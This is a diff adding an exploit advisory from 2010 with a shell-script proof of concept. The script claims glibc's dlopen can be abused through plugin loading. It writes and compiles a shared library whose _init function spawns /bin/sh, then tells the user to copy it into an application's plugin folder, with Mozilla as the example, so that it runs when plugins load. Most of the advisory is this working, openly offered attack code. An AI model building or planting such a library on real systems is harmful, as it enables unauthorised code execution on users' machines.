@@ -1,0 +1,45 @@
+# Exploit Title: Local Glibc shared library (.so) exploit
+# Date: 07.04.10
+# Author: Rh0 (Rh0@z1p.biz)
+# Software Link: NA
+# Version: <= 2.11.1, higher not tested
+# Tested on: Debian stable (x86-64), Ubunutu 9.10 (x86), Fedora 12 (x86)
+# CVE : NA
+# Code :
+
+#!/bin/sh
+
+# A lot of applications in linux use shared library structure to be
+# able to load plugins. E.g. Mozilla, Geany IDE, Compiz, Epiphany web
+# browser and more. Shared libraries are initialized (but not loaded)
+# often during startup, at a click at something like "->Tools->Plugins"
+# in the menue or at latest when they are activated. dlopen() is used
+# for initializing and is part of glibc.
+# See http://linux.die.net/man/3/dlopen.
+# It always executes the _init section of the shared library. A
+# malformed _init section makes dlopen crash (NULL dereference). But
+# this is not even necessary to exploit an application, as a custom
+# _init section is always executed when dlopen is called . The exploit
+# can be in the form of a custom compiled file. Also the _init section in
+# a plugin already shipped with the application can be overwritten with
+# working shellcode to exploit it or some \x41 to crash it .
+
+# PoC:
+
+cat >Xlibx.c<<EOF
+
+#include <unistd.h>
+_init()
+{
+execve("/bin/sh",NULL,NULL); // evil _init
+}
+EOF
+
+gcc -fPIC -c Xlibx.c
+ld -shared -soname Xlibx -o Xlibx.so -lc Xlibx.o
+rm Xlibx.c
+rm Xlibx.o
+
+echo "* copy Xlibx.so to appropriate directory:"
+echo "* Mozilla: HOMEDIR/.mozilla/plugins/ "
+echo "* firefox->Edit->Preferences => Exploit "
